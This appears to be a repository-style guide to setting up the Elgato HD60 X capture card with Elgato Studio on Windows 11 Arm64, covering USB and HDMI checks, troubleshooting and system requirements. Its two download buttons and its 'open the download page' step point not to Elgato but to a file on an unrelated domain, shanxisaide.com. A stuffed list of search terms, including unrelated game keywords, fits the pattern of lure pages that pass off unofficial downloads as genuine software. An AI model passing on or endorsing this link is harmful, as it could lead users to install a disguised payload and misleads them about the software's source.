# Set up HD60 X on Windows Arm64 with Elgato Studio

[![Download](https://img.shields.io/badge/Download-Elgato%20Studio-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)

## Fast Arm64 Capture Brief

What is Elgato Studio? A capture application with a native Arm64 Windows build and support for selected Elgato devices.  
Why use it for Arm64 Capture? Establish a known HD60 X setup before diagnosing USB, HDMI or recording trouble.  
Who needs it? HD60 X owners moving console capture to a Windows 11 Arm laptop or tablet.  
Does it support HD60 X on Windows on Arm? Elgato lists both the native build and HD60 X as compatible, but not every card shares that status.  

## Arm64 Capture Overview

This independent guide pairs Elgato Studio with the external HD60 X on Windows 11 Arm64. Elgato's Windows on ARM compatibility table checks the software and hardware separately. Windows can translate some x64 applications through Prism, but that does not make x64 drivers load on Arm or establish compatibility for a PCIe model such as 4K Pro.

Start by confirming that Windows sees the USB device, then check whether HDMI arrives at its input. A picture on the passthrough display does not prove the PC is receiving capture data over USB. Keep the first test at 1080p60 SDR with HDMI audio, and verify the saved file before introducing HDR, higher refresh rates or a dock.

The capture software and the card are separate components. Reports from x64 systems can describe the card's picture and controls but cannot confirm how a driver or utility behaves on Arm. A third-party recorder is an alternative only after you check that its build supports your architecture and can open the card on that host.

## Elgato Studio Capability Matrix

| Function | Role in workflow |
| --- | --- |
| Native Arm64 build | Runs on the intended Windows architecture without x64 app translation. |
| Capture device selector | Confirms the HD60 X is available to the recorder, not merely powered. |
| Video Flow | Lets you compare the incoming signal with the mode being captured. |
| Live preview | Shows whether video reaches the PC after the HDMI and USB stages. |
| HDMI input selection | Uses the console's embedded sound when HDMI is selected as the audio input. |
| Audio meters | Show whether a console menu sound reaches the application. |
| Record control | Produces a local sample to check for picture, sound and glitches. |
| Library | Helps find the latest sample and jump to its saved location. |

Treat device detection and signal detection as separate checkpoints. If HD60 X is listed but no picture arrives, change one HDMI variable at a time instead of replacing the installer or changing firmware immediately.

## Getting Started Playbook

Open Windows Settings → System → About and check that System type identifies an ARM-based processor, then choose the Arm64 installer in Elgato Downloads. Connect the console to HDMI In and, if using a separate play screen, connect that display to HDMI Out. Plug HD60 X directly into a 5 Gbps-capable USB port using the supplied data cable, without a dock for the first test. Set a supported 1080p60 SDR output as your baseline.

Close other capture programs and choose HD60 X in Elgato Studio. If it does not appear, check Device Manager while reconnecting the card; try a second verified USB 3 port if Windows never detects it. If the card appears, check the input signal, keep the audio input on HDMI, and listen for a console menu cue while watching the meter. Record a short sample and open it from Library to confirm the video and audio reach disk.

## Everyday Use

Open the app and verify your source before reconnecting a dock or changing the console mode. Ordinary capture has no login requirement; the optional prompter features are separate from HD60 X recording. After any cable or display change, check the signal readout and repeat the short save test before a long take.

## Practical Scenarios

Scenario A - Windows sees nothing: Swap to a known 5 Gbps data cable or port and look for the card to reappear in Device Manager.  
Scenario B - Device listed but preview black: Test the console at the 1080p60 SDR baseline and make sure its cable is connected to HDMI In.  
Scenario C - Picture without sound: Check the selected audio input and confirm the console is actually sending game audio over HDMI.  
Scenario D - Moving from PCIe: Check Elgato's per-model Arm compatibility instead of assuming your former x64 card can move to the new host.  

## System Requirements

| Item | Minimum | Recommended |
| --- | --- | --- |
| OS | Windows 11 Arm64 for this native configuration. | Fully updated Windows 11 with the vendor's supported Arm64 release. |
| CPU | An Arm64 Windows host; legacy x64 utility CPU requirements are not an Arm baseline. | A host that sustains the test recording without throttling on its usual power settings. |
| RAM | Elgato's Arm compatibility entry does not specify an HD60 X memory floor for this app. | Practical: 16 GB if running capture and a browser or editor together. |
| Storage | A local folder that can accept the test recording plus space for installation. | An internal SSD with headroom for the planned 1080p session. |
| Graphics | Capture and playback capability appropriate to the chosen format. | Verify smooth playback of the saved SDR sample before trying higher-demand modes. |
| Other | HD60 X, supported unencrypted HDMI source and a USB 3.2 Gen 1 data connection at 5 Gbps. | Use the included USB cable and a direct port while establishing the baseline. |

## Download Elgato Studio

Open the download page and select the Windows Arm64 build. Confirm the architecture, then check the card against the hardware notes.

[![Download](https://img.shields.io/badge/Download-Elgato%20Studio-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)

## Troubleshooting Common Issues

Install issues? If Windows is on Arm, confirm you selected the native package rather than an x64 download with a similar name.  
Performance problems? Remove the dock and compare a short 1080p60 SDR file with the live preview before increasing quality.  
Edition differences? HD60 X capture does not require a sign-in or an unlock entry.  
Compatibility? If Windows detects the HD60 X but the recorder cannot open it, close other capture software and check Windows camera access for desktop apps.  
Update failures? Verify the download architecture and read the release notes before changing app and card firmware at the same time.  

## Related Search Terms

Elgato Studio, Elgato Studio software, Elgato Studio download, Elgato Studio features, Elgato Studio Windows app, Elgato Studio reviews, Elgato Studio app, Elgato Studio alternatives, Elgato Studio for Windows, Elgato Studio latest version, Elgato Studio Arm64 HD60 X, HD60 X Windows on Arm, Elgato Studio Windows 11 Arm, native Arm64 console recorder, HD60 X Device Manager, HD60 X USB 5 Gbps, HD60 X HDMI audio missing, Elgato Studio 1080p60 SDR, Elgato PCIe Arm driver compatibility, gta 6 display chain, gta 6 hdr cable
